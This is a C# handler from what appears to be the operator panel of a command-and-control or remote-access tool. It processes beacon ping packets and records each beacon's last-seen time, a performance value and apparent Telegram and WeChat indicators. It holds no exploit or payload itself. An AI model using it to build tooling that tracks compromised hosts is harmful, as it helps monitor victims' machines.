using Avalonia.Threading;
using AVASClient.MessagePackLib;
using AVASClient.Models;
using AVASClient.Services;
using DataList.Beacon.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AVASClient.HandlePacket
{
    internal class HandlePing
    {
        public static async Task HandleAsync(ClientMsgPack msg)
        {
            await Task.Run(() => {
                Handle(msg);
            });
        }
        private static void Handle(ClientMsgPack unpack_msgpack)
        {
            try
            {
                string beaconId = unpack_msgpack.ForcePathObject("BeaconID").GetAsString();// 首先获取BeaconID
                
                BeaconInfo listBeacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == beaconId);
                
                if (listBeacon != null)
                {
                    
                    // 在 UI 线程上更新属性，确保 PropertyChanged 事件在正确的线程上触发
                    Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        try
                        {
                            listBeacon.Perfor_mance = unpack_msgpack.ForcePathObject("Perfor_mance").GetAsString();
                            listBeacon.tg = unpack_msgpack.ForcePathObject("tg").GetAsString();
                            listBeacon.wx = unpack_msgpack.ForcePathObject("wx").GetAsString();
                            listBeacon.LastSeenTime = DateTime.UtcNow;
                            
                        }
                        catch (Exception ex)
                        {
                            LogService.Instance.Error($"{beaconId}", "HandlePing", ex);
                        }
                    });
                }
                //else
                //{
                //    LogService.Instance.Warning($"在列表中未找到ID为 {beaconId} 的Beacon", "HandlePing");
                //}
            }
            catch (Exception ex)
            {
                LogService.Instance.Error($"处理 Ping 数据包时发生异常:{ex.ToString}", "HandlePing", ex);
            }
        }
    }
}
